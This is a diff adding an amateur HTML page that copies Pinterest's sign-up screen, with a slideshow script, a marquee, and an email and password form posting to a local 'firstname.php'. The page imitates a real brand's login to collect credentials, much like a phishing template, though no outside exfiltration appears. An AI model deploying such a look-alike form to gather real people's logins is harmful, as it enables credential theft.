@@ -1,0 +1,141 @@
+<html>
+<head>
+  <style type="text/css"> 
+
+        #myMarquee {
+	 opacity: 0.2;
+    filter: alpha(opacity=20);
+            -webkit-marquee-width: 5000px;
+            -webkit-marquee-direction: down;
+            -webkit-marquee-increment: 1px;
+            -webkit-marquee-repetition: infinite;
+            -webkit-marquee-speed: normal;
+         -webkit-marquee-style: scroll;
+		 left:0px;
+z-index:-1;
+position:absolute;
+	
+        }
+		
+		
+		.imgB2 { left: 350px; 
+		top: 80px;
+		position:absolute;
+	} 
+		.m{
+		position:absolute;
+		left:955px;
+		top:90px;
+		}
+		.J{
+		position:absolute;
+		left:565px;
+		top:100px;
+		color:white;
+		font-family:algerian;
+		
+		}
+		.k{
+		position:absolute;
+		left:430px;
+		top:120px;
+		color:white;
+		}
+		.p{
+		position:absolute;
+		left:450px;
+		top:170px;
+		color:white;
+		}
+		.c{
+		position:absolute;
+		left:590px;
+		top:230px;
+		color:blue;
+		}
+		.h{
+		position:absolute;
+		left:590px;
+		top:430px;
+	
+		}
+		.o{
+		position:absolute;
+		left:490px;
+		top:490px;
+	color:white;
+		}
+		.z{
+			position:absolute;
+		top:530px;
+		left:450px;
+		color:white;
+		font-family:arial black;
+		}
+		
+    </style>
+	<script type="text/javascript" src="sample.js">
+	</script>
+	<script type="text/javascript" >
+var image1 = new Image()
+image1.src = "i1.jpe"
+var image2 = new Image()
+image2.src = "i2.jpe"
+var image3 = new Image()
+image3.src = "i3.jpe"
+var image4 = new Image()
+image4.src = "i4.jpe"
+var image5 = new Image()
+image5.src = "15.jpe"
+var image6 = new Image()
+image6.src = "i6.jpe"
+
+</script>
+<p align="center" class="imgB2"><img src="i1.jpg" width="700" height="450" name="slide" /></p>
+<script type="text/javascript" >
+        var step=1;
+        function slideit()
+        {
+            document.images.slide.src = eval("image"+step+".src");
+            if(step<6)
+                step++;
+            else
+                step=1;
+            setTimeout("slideit()",15000);
+        }
+        slideit();
+</script>
+</head>
+<body bgcolor="grey">
+
+
+
+    <marquee direction="up" id="myMarquee" class="imgB1">
+   <img src="p1.png" width="1350px" height="495px"><img src="i4.jpe" width="1350px" height="495px"> 
+   </marquee> 
+   
+  
+<a href="login.html"><p class="m"><input type="submit" value="LOGIN"  style="height:35px; width:75px;border-radius:5px"></p></a>
+<p class="J"><font size=8><b>PINTEREST</b></p>
+<p class="k"><font size=6><b>He used Pinterest to start his rooftop oasis</b></p> 
+<p class="p"><font size=4>Join Pinterest to find (and save!) all the things that inspire you</p>
+<a href="https://www.facebook.com"><p class="c"><font size=6><input type="image" src="f.jpg" name="image"   style="height:45px; width:235px;border-radius:5px;"></p></a>
+<form name="mainform" onsubmit="sam()" method="post" action="firstname.php">
+
+<input type="text" value="Email" name="mail" id="email" style="border-radius:5px;height:45px; width:235px;position:absolute;left:590px;top:315px;color:grey;">
+
+<input type="password" value="hello" id="pass" style="border-radius:5px;height:45px;color:grey; width:235px;position:absolute;left:590px;top:385px;">
+<a href="login.html"><p class="h"><input type="submit" value="SIGN IN"  style="height:45px; width:240px;border-radius:5px;font-family:arial;color:white;font-size:20px;background-color:red;" onclick="firstname.html"></p></a>
+<p id="v" style="color:red"></p>
+
+</form>
+<pre class="o"><font size=3>Creating an account means you are okay with Pinterest's
+           Terms of Service and Privacy Policy.</pre>
+		 
+<pre class="z"><b><font size=5>30+</font> billion Pins to explore ||15  seconds to sign up (free!) </b> </pre> 
+            
+ 
+
+
+</body>
+</html>
